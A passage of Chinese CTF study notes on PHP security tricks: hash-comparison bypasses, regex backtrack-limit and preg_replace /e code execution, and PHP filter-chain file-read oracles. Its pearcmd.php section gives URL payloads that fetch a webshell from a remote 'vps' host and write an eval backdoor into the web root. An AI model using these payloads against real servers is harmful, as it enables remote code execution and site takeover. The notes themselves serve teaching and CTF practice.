Strike提供了钓鱼攻击、恶意软件植入等功能，用于在目标系统上植入后门、远程访问工具等。\n2. **漏洞利用模块**：工具包含了各种漏洞利用模块，可用于利用目标系统中的漏洞。\n3. **C2功能**：Cobalt Strike具有C2（命令和控制）功能，允许攻击者与受感染的系统进行通信、控制和数据交换。\n\n提权没打过，确实写不动了，后面学了再回来补\n","tags":["SQL注入"],"categories":["SQL注入"]},{"title":"PHP的一些小技巧","url":"/3025/05/07/PHP的一些小技巧/","content":"\n## include和file_get_content处理伪协议的不同\n\n在讲这个内容之前，我们需要了解一下file_get_content的源码实现\n\n在 PHP 源码里，`file_get_contents` 定义在 **ext/standard/file.c**，直接去github里面看吧\n\nhttps://github.com/php/php-src/blob/PHP-7.3.6/ext/standard/file.c\n\n```c\nPHP_FUNCTION(file_get_contents)\n{\n\tchar *filename;\n\tsize_t filename_len;\n\tzend_bool use_include_path = 0;\n\tphp_stream *stream;\n\tzend_long offset = 0;\n\tzend_long maxlen = (ssize_t) PHP_STREAM_COPY_ALL;\n\tzval *zcontext = NULL;\n\tphp_stream_context *context = NULL;\n\tzend_string *contents;\n\n\t/* Parse arguments */ \n\tZEND_PARSE_PARAMETERS_START(1, 5)\n\t\tZ_PARAM_PATH(filename, filename_len)\n\t\tZ_PARAM_OPTIONAL\n\t\tZ_PARAM_BOOL(use_include_path)\n\t\tZ_PARAM_RESOURCE_EX(zcontext, 1, 0)\n\t\tZ_PARAM_LONG(offset)\n\t\tZ_PARAM_LONG(maxlen)\n\tZEND_PARSE_PARAMETERS_END();\n\n\tif (ZEND_NUM_ARGS() == 5 && maxlen < 0) {\n\t\tphp_error_docref(NULL, E_WARNING, \"length must be greater than or equal to zero\");\n\t\tRETURN_FALSE;\n\t}\n\n\tcontext = php_stream_context_from_zval(zcontext, 0);\n\n\tstream = php_stream_open_wrapper_ex(filename, \"rb\",\n\t\t\t\t(use_include_path ? USE_PATH : 0) | REPORT_ERRORS,\n\t\t\t\tNULL, context);\n\tif (!stream) {\n\t\tRETURN_FALSE;\n\t}\n\n\tif (offset != 0 && php_stream_seek(stream, offset, ((offset > 0) ? SEEK_SET : SEEK_END)) < 0) {\n\t\tphp_error_docref(NULL, E_WARNING, \"Failed to seek to position \" ZEND_LONG_FMT \" in the stream\", offset);\n\t\tphp_stream_close(stream);\n\t\tRETURN_FALSE;\n\t}\n\n\tif (maxlen > INT_MAX) {\n\t\tphp_error_docref(NULL, E_WARNING, \"maxlen truncated from \" ZEND_LONG_FMT \" to %d bytes\", maxlen, INT_MAX);\n\t\tmaxlen = INT_MAX;\n\t}\n\tif ((contents = php_stream_copy_to_mem(stream, maxlen, 0)) != NULL) {\n\t\tRETVAL_STR(contents);\n\t} else {\n\t\tRETVAL_EMPTY_STRING();\n\t}\n\n\tphp_stream_close(stream);\n}\n```\n\n先看看局部变量\n\n```c\nchar *filename;\t\t//传入的文件路径或url\nsize_t filename_len;\t//文件名长度\nzend_bool use_include_path = 0;\t\t\nphp_stream *stream;\t\t//打开的文件或协议流\nzend_long offset = 0;\nzend_long maxlen = (ssize_t) PHP_STREAM_COPY_ALL;\nzval *zcontext = NULL;\nphp_stream_context *context = NULL;\nzend_string *contents;\n```\n\n然后我们看对协议流的处理\n\n```c\nstream = php_stream_open_wrapper_ex(filename, \"rb\",\n            (use_include_path ? USE_PATH : 0) | REPORT_ERRORS,\n            NULL, context);\n```\n\n我们主要看php_stream_open_wrapper_ex 函数，因为这个是处理流包装器的主要逻辑\n\n\n\n`file_get_contents`针对`data:,x/profile`识别为`x/profile`去读取，读取内容为空，而`include`无法对`data:,x/profile`无法解析成`php伪协议`，当成字符串读取`data:,x/profile`文件去解析其中的php内容\n\n## 关于md5和sha1绕过\n\n### 1.数组绕过\n\n对于php强比较和弱比较：md5()，sha1()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的。\n\n### 2.0e绕过\n\n对于某些特殊的字符串加密后得到的密文以0e开头，PHP会当作科学计数法来处理，也就是0的n次方，得到的值比较的时候都相同\n\nmd5加密后是0e开头的：\n\n```\n240610708:0e462097431906509019562988736854\nQLTHNDT:0e405967825401955372549139051580\nQNKCDZO:0e830400451993494058024219903391\nPJNPDWY:0e291529052894702774557631701704\nNWWKITQ:0e763082070976038347657360817689\nNOOPCJF:0e818888003657176127862245791911\nMMHUWUV:0e701732711630150438129209816536\nMAUXXQC:0e478478466848439040434801845361\n```\n\nsha1加密后是0e开头的\n\n```\n10932435112: 0e07766915004133176347055865026311692244\naaroZmOk: 0e66507019969427134894567494305185566735\naaK1STfY: 0e76658526655756207688271159624026011393\naaO8zKZF: 0e89257456677279068558073954252716165668\naa3OFF9m: 0e36977786278517984959260394024281014729\n0e1290633704: 0e19985187802402577070739524195726831799\n```\n\n### 3.双重md5下的0e绕过\n\n以下字符串进行两次md5后以0e开头\n\n- `7r4lGXCH2Ksu2JNT3BYM`\n- `CbDLytmyGm2xQyaLNhWn`\n- `770hQgrBOjrcqftrlaZk`\n\n### 4.md5绕过SQL\n\n```\nffifdyop，经过md5函数后结果为 'or'6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c；\n\n129581926211651571912466741651878684928，经过md5函数后结果为 \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1'or'8；\n```\n\n这两个加密后都是万能密码\n\n### 5.md5(sha1)加密后弱等于初始值\n\n`$a==md5($a)`\n\n`0e215962017` 的 MD5 值也是由 **0e** 开头，在 PHP 弱类型比较中相等\n\n**$a==sha1($a)**\n\n0e1290633704的sha1值也是由0e开头的，在弱比较中相等\n\n### 6.图片文本强碰撞绕过\n\n可以用工具fastcoll（md5强碰撞生成工具）\n\n例如我们需要生成两个md5值相同的图片/文本，可以利用工具去生成\n\n![9ed27e530d8b8e2ec0c225fe8a85d8ec](../image/achieve/202411/XYCTF2024/9ed27e530d8b8e2ec0c225fe8a85d8ec.png)\n\n## is_numeric()函数绕过\n\n![image-20250611170208447](../image/achieve/202411/PHP小妙招/image-20250611170208447.png)\n\n如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回空值，即 FALSE。\n\n绕过!is_numeric($num)的判断：\n\n- is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。\n- 构造浮点数可以绕过判断\n\n## strcmp()函数绕过\n\n`strcmp()` 是一个 PHP 函数，用于比较两个字符串。它的用法如下：\n\n```\nint strcmp ( string $str1 , string $str2 )\n```\n\n- 如果 `str1` 小于 `str2`，那么 `strcmp()` 返回一个小于 0 的整数。\n- 如果 `str1` 大于 `str2`，那么 `strcmp()` 返回一个大于 0 的整数。\n- 如果 `str1` 等于 `str2`，那么 `strcmp()` 返回 0。\n\nstrcmp函数无法比较数组对象，会返回0\n\n## intval()函数漏洞绕过\n\n### 什么是intval()？\n\n`intval()` 函数是 PHP 中的一个内置函数，用于获取变量的整数值。常用于强制类型转换。\n\n基础语法\n\n```\nintval(mixed $value, int $base = 10): int\n```\n\n参数：\n\n- $var：需要转换成 integer 的「变量」\n- $base：转换所使用的「进制」\n\n**注意**:\n\n如果 `base` 是 0，通过检测 `value` 的格式来决定使用的进制：\n\n- 如果字符串包括了 \"0x\" (或 \"0X\") 的前缀，使用 16 进制 (hex)；否则，\n- 如果字符串以 \"0b\" (或 \"0B\") 开头，使用 2 进制 (binary)；否则，\n- 如果字符串以 \"0\" 开始，使用 8 进制(octal)；否则，\n- 将使用 10 进制 (decimal)。\n\n返回值\n\n成功时返回 `value` 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。\n\n举个例子\n\n```php\n<?php\necho intval(42);          //42\necho \"\\n\";\necho intval(42.2);        //42\necho \"\\n\";\necho intval(042);         //34\necho \"\\n\";\necho intval(0x42);        //66\necho \"\\n\";\necho intval(array('name'));     //1\necho \"\\n\";\necho intval(array());           //0\necho \"\\n\";\n```\n\n### 绕过思路\n\n- 当某个数字被过滤时，可以使用它的 8进制/16进制来绕过；比如过滤10，就用012（八进制）或0xA（十六进制）。\n- 对于弱比较（a==b），可以给a、b两个参数传入空数组，使弱比较为true。\n- 当某个数字被过滤时，可以给它增加小数位来绕过；比如过滤3，就用3.1。\n- 当某个数字被过滤时，可以给它拼接字符串来绕过；比如过滤3，就用3ab。\n- 当某个数字被过滤时，可以两次取反来绕过；比如过滤10，就用~~10。\n- 当某个数字被过滤时，可以使用算数运算符绕过；比如过滤10，就用 5+5 或 2*5。\n\n## 关于preg_match()绕过\n\n### 什么是preg_match？\n\n![image-20250403142430100](../image/achieve/202411/PHP小妙招/image-20250403142430100.png)\n\n### 绕过方法\n\n- 数组绕过\n\npreg_match只能处理字符串，当传入的subject是数组时会返回false\n\n- 换行符绕过\n\n特殊字符`.`在正则表达式中可以匹配任何字符串，换行符除外\n\n例如我们这里有代码\n\n```php\n<?php\nhighlight_file(__FILE__);\nif(preg_match(\"/^.*(flag).*$/\",$_GET['a'])){\n    echo \"匹配成功\";\n}else {\n    echo \"匹配失败\";\n}\n```\n\n如果我们传入a=flag，就满足了正则匹配，返回匹配成功\n\n如果我们传入a=%0aflag,就能绕过正则匹配，返回匹配失败，这是为什么呢？\n\n当传入 `a=\\nflag` 时：\n\n1. **`^`** - 匹配字符串开头\n\n2. `.*`\\- 尝试贪婪匹配：\n\n   - 默认情况下 `.` 不匹配换行符 `\\n`\n   - 所以 `.*` 在这里匹配空字符串\n\n3. 剩余字符串\n\n   ```\n   \\nflag\n   ```\n\n   - 需要匹配 `(flag)`，但开头是 `\\n`\n   - 无法匹配 `f`，所以整体匹配失败\n\n4. **返回0**（不匹配）\n\n`*` 是贪婪量词，会尽可能多地匹配字符。当后续匹配失败时，会逐步\"吐出\"已匹配的字符（回溯）。\n\n### PHP利用PCRE回溯次数限制绕过\n\n参考P牛的文章：[PHP利用PCRE回溯次数限制绕过某些安全限制](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)\n\n实例代码如下\n\n```php\n<?php\nfunction is_php($data){  \n    return preg_match('/<\\?.*[(`;?>].*/is', $data);  \n}\n\nif(!is_php($input)) {\n    // fwrite($f, $input); ...\n}\n```\n\n分析一下就是判断用户输入的内容有没有php代码，如果没有就写入文件，显而易见我们需要绕过这个正则匹配去写入我们期望的代码，这时候该怎么做呢？\n\n### 正则引擎\n\n常见的正则引擎，往往被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机），他们匹配的过程是这样的\n\n- DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入(线性匹配)\n- NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态(回溯机制)\n\n大多数编程语言都采用的NFA作为正则引擎，其中也包括PHP使用的PCRE库\n\n### 回溯的过程\n\n例如p牛这里测试了一个案例\n\n假设匹配的输入是`<?php phpinfo();//aaaaa`，实际执行流程是这样的：\n\n![image.png](../image/achieve/202411/PHP小妙招/51bfc7bb-fd9a-402e-971a-a2247b226f3d.3adc35af4c1d.png)\n\n可以看见在第四步的时候，由于`.*`贪婪匹配机制，第一个`.*`最终匹配到我们输入的字符串的结尾(`<?php phpinfo();//aaaaa`)，但这样的话后面的匹配就匹配不上，因为在`.*`后还应该匹配**[(\\`;?>]**，所以NFA开始回溯匹配，从末尾开始，先吐出一个a，此时`.*`匹配的是`<?php phpinfo();//aaaa`，尝试用**[(\\`;?>]**去匹配a，但仍然匹配不上，继续回溯，再吐出一个a，尝试匹配aa，但仍然不行......\n\n一直回溯直到第12步，此时`.*`匹配的是`<?php phpinfo()`后面的`;`则匹配上**[(\\`;?>]**，此时这个结果才能满足正则表达式的结果，于是就不再回溯，继续向后匹配表达式，第二个`.*`匹配到了字符串末尾，最后结束匹配。\n\n以上就是NFA的回溯机制。\n\n### 关于PHP的pcre.backtrack_limit限制利用\n\nPHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限`pcre.backtrack_limit`。我们可以通过`var_dump(ini_get('pcre.backtrack_limit'));`的方式查看当前环境下的上限：\n\n![image-20250403150831133](../image/achieve/202411/PHP小妙招/image-20250403150831133.png)\n\n在官方文档中也有写到\n\n![image-20250403150958553](../image/achieve/202411/PHP小妙招/image-20250403150958553.png)\n\n可见，回溯次数上限默认是100万。那么，假设我们的回溯次数超过了100万，会造成什么结果呢？我们尝试一下\n\n```\nvar_dump(preg_match('/<\\?.*[(`;?>].*/is','<?php phpinfo();//' . str_repeat('c',1000000)));\n```\n\n![image-20250403151342526](../image/achieve/202411/XYCTF2024/image-20250403151342526.png)\n\n结果返回了false，而并非1和0，`preg_match`函数返回false表示此次执行失败了\n\n![image-20250403151628711](../image/achieve/202411/PHP小妙招/image-20250403151628711.png)\n\n我们可以用\n\n```\npreg_last_error() === PREG_BACKTRACK_LIMIT_ERROR\n```\n\n这行代码用于**检测最后一次PCRE正则操作是否因回溯限制而失败**。\n\n| 组成部分                     | 说明                                         |\n| ---------------------------- | -------------------------------------------- |\n| `preg_last_error()`          | PHP函数，返回最后一次PCRE正则操作的错误代码  |\n| `PREG_BACKTRACK_LIMIT_ERROR` | PHP常量，值为2，表示正则匹配超出最大回溯限制 |\n| `===`                        | 比较运算符，检查值和类型是否完全一致         |\n\n![image-20250403151741726](../image/achieve/202411/PHP小妙招/image-20250403151741726.png)\n\n这里返回true，说明确实是因为超出了最大回溯限制而执行失败\n\n所以上面那道例题的答案就很明显了，可以通过发送超长字符串使正则执行失败，让我们的php代码成功写入\n\n最终的exp\n\n```php\nimport requests\nfrom io import BytesIO\n    \nurl = \"\"\n\nfiles = {\n  'file': BytesIO(b'aaa<?php phpinfo();//' + b'a' * 1000000)\n}\n\nr = requests.post(url=url, files=files, allow_redirects=False)\nprint(r.headers)\n```\n\n## preg_replace /e 模式下的RCE\n\n限制版本：PHP <=5.5\n\n参考文章：[深入研究preg_replace与代码执行](https://mochazz.github.io/2018/08/13/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6preg_replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#%E5%89%8D%E8%A8%80)\n\n### 什么是**preg_replace**()函数？\n\npreg_replace — 执行一个正则表达式的搜索和替换\n\n```\npreg_replace(\n    string|array $pattern,\n    string|array $replacement,\n    string|array $subject,\n    int $limit = -1,\n    int &$count = null\n): string|array|null\n```\n\n![image-20250403154616821](../image/achieve/202411/PHP小妙招/image-20250403154616821.png)\n\n其实这里的漏洞很简单，如果**preg_replace** 使用了 **/e** 模式，就可以导致代码执行，当使用了/e模式的时候，**preg_replace** 函数在匹配到符号正则的字符串时，会将替换字符串当成代码去执行，\n\n举个例子\n\n```php\n<?php\nhighlight_file(__FILE__);\nfunction complex($re, $str) {\n    return preg_replace('/(' . $regex . ')/ei','strtolower(\"\\\\1\")',$str);\n}\n\n\nforeach($_GET as $regex => $str) {\n    echo complex($regex, $str). \"\\n\";\n}\n```\n\n因为这里第一个和第三个参数都是我们可控的，我们也知道了preg_replace匹配到符号正则的字符串时，会将替换字符串当成代码去执行，但是因为这里第二个参数是固定的，此时我们应该怎么执行代码呢？\n\n在参数2中，我们可以看到有`\\1`，其实`\\1`在这个函数中是有含义的，`\\1` 是 **反向引用**，指代正则中的第1个捕获组。\n\n### 反向引用\n\n如果在正则表达式两边添加括号，那么就会导致相关的**匹配存储到一个临时的缓冲区**，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。\n\n![image-20250403161315817](../image/achieve/202411/XYCTF2024/image-20250403161315817.png)\n\n所以实际上这里就是匹配第一个子匹配项，可能现在还不能理解，先拿payload去讲解吧\n\n```\nGET：/?.*={${phpinfo()}} \n```\n\n那么结果就是\n\n```\n原先的语句： preg_replace('/(' . $regex . ')/ei', 'strtolower(\"\\\\1\")', $value);\n变成了语句： preg_replace('/(.*)/ei', 'strtolower(\"\\\\1\")', {${phpinfo()}});\n```\n\n本身这个payload是可以实现的，但是因为这是在GET传参，PHP在处理参数名的时候会将`.`换成下划线导致无法执行，当非法字符为首字母时，只有点号会被替换成下划线。\n\n所以我们这里要做的就是让正则匹配能完全匹配到我们的`{${phpinfo()}}`，这里师傅给出了一个payload\n\n```\n\\S*=${phpinfo()}\n```\n\n然后我们再解释一下为什么需要匹配到`{${phpinfo()}}`才能执行里面的代码，这也是一个小点，其实就是可变变量的原因\n\n![image-20250403162447924](../image/achieve/202411/PHP小妙招/image-20250403162447924.png)\n\n所以**在双引号的包裹下，我们的字符串会检查并解析变量，而单引号不会**，**${phpinfo()}** 中的 **phpinfo()** 会被当做变量先执行，执行后，即变成 **${1}** (phpinfo()成功执行返回true)\n\n```\nphp > var_dump(phpinfo());\n.\n.\n.\nbool(true)\nphp >\n```\n\n另外需要注意的是，**在/e模式下执行代码的时候会自动转义特殊字符**\n\n## PHP中非法变量的解析\n\n![image-20250325112657901](../image/achieve/202411/PHP小妙招/image-20250325112657901.png)\n\n参数名中含有`空格`和`点`，可以看到当我们传入`?mo yu.=xxx`时，传入的参数名中点`.`和`空格`都被替换为了下划线`_`，从而变成mo_yu_这样的参数名确实无法传参\n\n当`PHP版本小于8`时，如果参数中出现中括号`[`，中括号会被转换成下划线`_`，但是会出现转换错误导致接下来如果该参数名中还有`非法字符`并不会继续转换成下划线`_`，也就是说如果中括号`[`出现在前面，那么中括号`[`还是会被转换成下划线`_`，但是因为出错导致接下来的非法字符并不会被转换成下划线`_`\n\n## pearcmd.php的妙用\n\n### 1. register_argc_argv\n\n如果环境中含有php.ini，则默认register_argc_argv=Off；如果环境中没有php.ini，则默认register_argc_argv=On\n\n这个register_argc_argv能干什么呢？\n\n我们先本地测试一下\n\n```php\n//test.php\n<?php\nvar_dump($_SERVER['argv']);//以数组形式输出我们的命令行参数\n?>\n```\n\n```\n//在 CLI 模式 下\nroot@dkhkv28T7ijUp1amAVjh:/# php test.php \narray(1) {\n  [0]=>\n  string(8) \"test.php\"\n}\n\nroot@dkhkv28T7ijUp1amAVjh:/# php test.php 1 2 3\narray(4) {\n  [0]=>\n  string(8) \"test.php\"\n  [1]=>\n  string(1) \"1\"\n  [2]=>\n  string(1) \"2\"\n  [3]=>\n  string(1) \"3\"\n}\n```\n\n在web页模式下必须在php.ini开启register_argc_argv配置项\n设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果\n\n然后我们如何利用呢？\n\n```php\n<?php\n\nvar_dump($_SERVER['argv']);\n$a = $_SERVER['argv'];\n$a[0]($a[1]);\n?>\n```\n\n不过这个在web下测试更方便，但是不知道为什么这里没测出来，所以直接在CLI下测了\n\n```\nroot@dkhkv28T7ijUp1amAVjh:/var/www/html# cat 1.php\n<?php\n\nvar_dump($_SERVER['argv']);\n$a = $_SERVER['argv'];\n$a[1]($a[2]);\n?>\nroot@dkhkv28T7ijUp1amAVjh:/var/www/html# php 1.php system ls\narray(3) {\n  [0]=>\n  string(5) \"1.php\"\n  [1]=>\n  string(6) \"system\"\n  [2]=>\n  string(2) \"ls\"\n}\n1.php\nindex.nginx-debian.html\nupload\nxss.php\n```\n\n可以看到成功执行了\n\n然后我们看pearcmd.php的神奇使用，最好的就是p牛的文章了\n\nPEAR是为PHP扩展与应用库(PHP Extension and Application Repository)，它是一个PHP扩展及应用的一个代码仓库\n类似于composer，用于代码的下载与管理。\n\npear可以用来拉取远程的代码\n\n```\npear install -R /tmp http://vps/shell.php\n```\n\n该payload可以用来拉取我们vps上的shell.php文件并解析执行\n\n### 2.register_argc_argv和pear的关系\n\n**当执行了pear后，会将$_SERVER[‘argv’]当作参数执行！如果存在文件包含漏洞的话，就可以包含pearcmd.php，拉取远程服务器上的文件到靶机，再通过文件包含获取shell。**\n\n### 3.payload\n\n如果靶机出网\n\n```php\n//test.php\n<?php\ninclude($_GET['file']);\n?>\n```\n\n我们尝试拉取远程服务器的shell.php到靶机的/tmp目录下\n\npayload\n\n```\nhttp://localhost/test.php?file=/usr/local/lib/php/pearcmd.php&+install+-R+/tmp+http://vps/shell.php\n//shell就是我们的一句话木马\n```\n\n然后文件包含shell.php同时传参cmd即可\n\n解释payload\n\n- **`?file=/usr/local/lib/php/pearcmd.php`**\n  - 指定 `pearcmd.php` 文件的路径。\n  - `pearcmd.php` 是 PEAR（PHP 扩展和应用库）的命令行工具。\n- **`&+install+-R+/tmp+http://vps/shell.php`**\n  - 这是 `pearcmd.php` 的 `install` 命令的参数。\n  - `install`：安装指定的包。\n  - `-R /tmp`：将安装的文件保存到 `/tmp` 目录。\n  - `http://vps/shell.php`：从远程服务器下载的恶意文件。\n\n如果靶机不出网，我们可以写一句话木马进hello.php\n\n```\nhttp://localhost/test.php?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=@eval($_POST['shell']);?>+/var/www/html/shell.php\n```\n\n解释payload\n\n- **`?+config-create+`**\n  - 这是 PHP 的 `pearcmd.php` 工具的一个参数，用于创建配置文件。\n  - `pearcmd.php` 是 PEAR（PHP 扩展和应用库）的命令行工具。\n- **`/&file=/usr/local/lib/php/pearcmd.php&/`**\n  - 指定 `pearcmd.php` 文件的路径。\n  - 如果服务器上存在 `pearcmd.php`，这段代码会尝试调用它。\n- **`<?=eval($_POST[1])?>`**\n  - 这是一个 PHP 短标签，用于执行 `eval($_POST[1])`。\n  - `eval` 函数会执行传入的 PHP 代码，`$_POST[1]` 是从 POST 请求中获取的参数。\n  - 这段代码的目的是将恶意 PHP 代码写入目标文件。\n- **`+/tmp/hello.php`**\n  - 指定目标文件的路径，即 `/tmp/hello.php`。\n  - 如果攻击成功，恶意代码会被写入该文件。\n\n后来看了p牛的文章才知道$SERVER并不任务&符号是参数的分隔符，而是将+号作为分隔符\n\n## 逃逸eval中注释符\n\n```php\n<?php\nhighlight_file(__FILE__);\n$a = $_GET['a'];\neval(\"#\". $a .\"2323\");\n```\n\n从eval中可以看到我们需要处理两个坑点\n\n- 前面的`#`注释符会把后面的代码注释掉\n- 后面的2323是脏数据，需要处理掉\n\n后面的脏数据其实很好处理，我们在传入参数的结尾加上注释就可以，问题是如何绕过前面的注释符让我们的代码生效\n\n我们可以用换行符(`\\n`)\n\n例如我们传入\n\n```\n?a=\\necho '1';#\n```\n\n因为eval函数会把括号中的内容当成php代码去拼接在语句中。所以理论上如果我们传入换行符就会变成这样\n\n```php\n#\\n\necho '1';#2323\n```\n\n此时成功逃逸注释，我们便可以传入想要传入的代码\n\n但是需要注意的是\n\n- 注意# 是 URL 的锚点标识符，这里需要对#进行编码成%23，否则会被认为是URL本身的分隔符，\n\n\n- 根据**`\\n` 和 `\\r` 在 HTTP 请求中的特殊作用**，如果 `\\n` 不经编码直接传入 `?a=\\n123`，服务器或浏览器可能会错误地认为 `\\n` 是 **HTTP 请求结束符**，导致参数被截断。所以我们的`\\n`也是需要编码成URL编码才能起作用的\n\n所以最终我们需要传入的payload是\n\n```\n?a=%0aecho '1';%23\n```\n\n## PHP filter chains的报错攻击\n\n参考文章：https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle\n\n有朋友问到一个题目很有意思，是红明谷初赛2024的web中的ezphp\n\n```php\n<?php\nhighlight_file(__FILE__);\n//flag.php\nif(isset($_POST['a'])){\n    echo hash_file('md5',$_POST['a']);\n}\n?>\n```\n\n这里的话根据hash_file函数指定的散列算法md5去处理我们传入的文件名的文件内容，我们先关注一下这个函数\n\n### hash_file函数\n\n![image-20250411150622351](../image/achieve/202411/PHP小妙招/image-20250411150622351.png)\n\n可以看到第一个参数就是指定的散列算法的类型，第二个就是文件名，这里提示有flag.php，我们传进去看看\n\n```\nPOST：a=flag.php\n```\n\n然后获得到这个文件的哈希值\n\n```\n5fb6f40193d35a9353d6952f341c87e6\n```\n\n然后这题其实是关于PHP filter chains的基于错误的 Oracle 读取文件，但是我们还是先了解一下这个PHP filter chains\n\n### 什么是PHP filter chains\n\n**PHP Filter Chains** 是一种**利用 PHP 内置的过滤器（Filter）功能构造过滤器链**来执行代码或绕过安全限制的技术。例如我们平时用的php://filter伪协议，也是构造过滤器链。当 PHP 处理过滤器链时，恶意代码会被解码并执行。\n\n当它被传递给易受攻击的函数（例如`file()`、`hash_file()`或）时，即使服务器没有返回文件内容，也可以用来泄露本地文件的内容\n\n例如我们举个例子,在本地测试一下\n\n```php\n<?php \nhighlight_file(__FILE__);\necho file($_GET['c']); \n?>\n```\n\n我们看看file函数的官方解释\n\n### file函数\n\n![image-20250411161125698](../image/achieve/202411/PHP小妙招/image-20250411161125698.png)\n\nPHP的file函数读取一个文件，但不打印其文件的内容，这意味着服务器的响应中不会显示任何内容。\n\n例如我web目录下有一个1.txt文件\n\n```\n//1.txt\n123\n```\n\n然后我传入?c=1.txt\n\n![image-20250411161443151](../image/achieve/202411/PHP小妙招/image-20250411161443151.png)\n\n可以看到这里并没有返回文件的内容而是返回了数组\n\n然后我们继续往下看\n\n### 攻击思路\n\n看看原文，然后再一句句翻译\n\n![image-20250411161733120](../image/achieve/202411/PHP小妙招/image-20250411161733120.png)\n\n- 使用iconv过滤器通过编码去增加数据大小来触发内存错误\n- 使用dechunk过滤器根据上一个错误确定文件的第一个字符。\n- 再次使用iconv过滤器，使用不同字节顺序的编码来交换剩余的字符。\n\n然后我们看一下iconv的作用\n\n#### 利用iconv触发内存错误\n\n![image-20250411162109606](../image/achieve/202411/PHP小妙招/image-20250411162109606.png)\n\n对于iconv函数来说，他能接收传递给它的字符串的编码，也可以直接从php://filter包装器调用，我们先本地测试一下\n\n```\nroot@VM-16-12-ubuntu:/# php -r '$string = \"START\"; echo strlen($string).\"\\n\";'\n5\n```\n\n在UTF8的编码下字符串START的长度为5个字节。\n\n```\nroot@VM-16-12-ubuntu:/# php -r '$string = \"START\"; echo strlen(iconv(\"UTF8\",\"UNICODE\",$string)).\"\\n\";'\n12\n```\n\n为什么换成UNICODE编码就是12个字节呢？在 `iconv` 中，`UNICODE` 并不是一种标准的编码名称。`iconv` 将 `UNICODE` 解释为 **UTF-16** 编码，而字符串 `\"START\"` 包含 5 个字符，每个字符都是 ASCII 字符（码点范围：0-127）。在 UTF-16 编码中，每个 ASCII 字符使用 2 个字节表示。然后`iconv` 在转换时还会在输出的开头添加 **BOM（Byte Order Mark）**，用于标识字节序。BOM 在 UTF-16 中占用 2 个字节。\n\n所以一共合起来是12个字节\n\n```\nroot@VM-16-12-ubuntu:/# php -r '$string = \"START\"; echo strlen(iconv(\"UTF8\", \"UCS-4\", $string)).\"\\n\";'\n20\n```\n\n`UCS-4` 是一种固定长度的 Unicode 编码方式，使用 **4 个字节** 表示每个字符。但是我们需要用到的是UCS-4LE而不是UCS-4，UCS-4LE的编码的字节序是默认固定的，而`UCS-4` 的字节序是 **未明确指定的**，通常由系统默认决定。\n\n在PHP中，资源限制由php.ini的memory_limit参数定义。它的默认值是128MB。如果试图读取大于此大小的文件，则会引发错误\n\n![image-20250411164606166](../image/achieve/202411/PHP小妙招/image-20250411164606166.png)\n\n例如我们尝试对字符串进行多次编码\n\n```php\n<?php\n\n$string = \"START\";\n\nfor ($i = 1; $i <= 13; $i++) {\n    $string = iconv(\"UTF8\", \"UCS-4LE\", $string);\n}\n```\n\n在内存中的操作是这样的\n\n![exponential_size](../image/achieve/202411/PHP小妙招/exponential_size_0.png)\n\n终端执行\n\n```\nroot@VM-16-12-ubuntu:/var/www/html# php 2.php\nFatal error: Allowed memory size of 134217728 bytes exhausted (tried to allocate 83886144 bytes) in /var/www/html/2.php on line 6\n```\n\n以上就是如何触发内存错误的学习讲解\n\n#### 如何泄漏文件第1个字符\n\n刚刚我们看到了如何触发这个错误，现在我们来看看如何转化成基于错误的 Oracle\n\nDechunk过滤器\n\n这里其实是利用了php://filter包装器中的Dechunk方法，但是好像我在PHP文档中并没有搜查到\n\n其目的是处理分块传输编码。后者将数据拆分为2个以CRLF结尾的行的块，第一个行定义块长度。\n\n我们跟着文章试一下\n\n```\nroot@VM-16-12-ubuntu:/# echo \"START\" > /tmp/test\nroot@VM-16-12-ubuntu:/# php -r 'echo file_get_contents(\"php://filter/dechunk/resource=/tmp/test\");'\nSTART\nroot@VM-16-12-ubuntu:/# echo \"123456\" > /tmp/test\nroot@VM-16-12-ubuntu:/# php -r 'echo file_get_contents(\"php://filter/dechunk/resource=/tmp/test\");'\nroot@VM-16-12-ubuntu:/# echo \"ATART\" > /tmp/test\nroot@VM-16-12-ubuntu:/# php -r 'echo file_get_contents(\"php://filter/dechunk/resource=/tmp/test\");'\nroot@VM-16-12-ubuntu:/# echo \"0TART\" > /tmp/test\nroot@VM-16-12-ubuntu:/# php -r 'echo file_get_contents(\"php://filter/dechunk/resource=/tmp/test\");'\n```\n\n文章解释的是，当第一个字符是十六进制值（[0-9]，[a-f]，[A-F]）时，文件内容在通过dechunk过滤器时被丢弃。这是因为如果十六进制长度后面没有CRLF，解析将失败。\n\n因此，如果第一个字符是十六进制值，输出将为空，否则完整的链不会改变，并且会触发memory_limit错误，从而完成我们的oracle。\n\n然后我们将以上两种技巧联合起来\n\n```php\n<?php\n\n$size_bomb = \"\";\nfor ($i = 1; $i <= 13; $i++) {\n    $size_bomb .= \"convert.iconv.UTF8.UCS-4|\";\n}\n$filter = \"php://filter/dechunk|$size_bomb/resource=/tmp/test\";\n\necho file_get_contents($filter);\n```\n\n这里的话构造了一个过滤器链，拼接**`convert.iconv.UTF8.UCS-4` 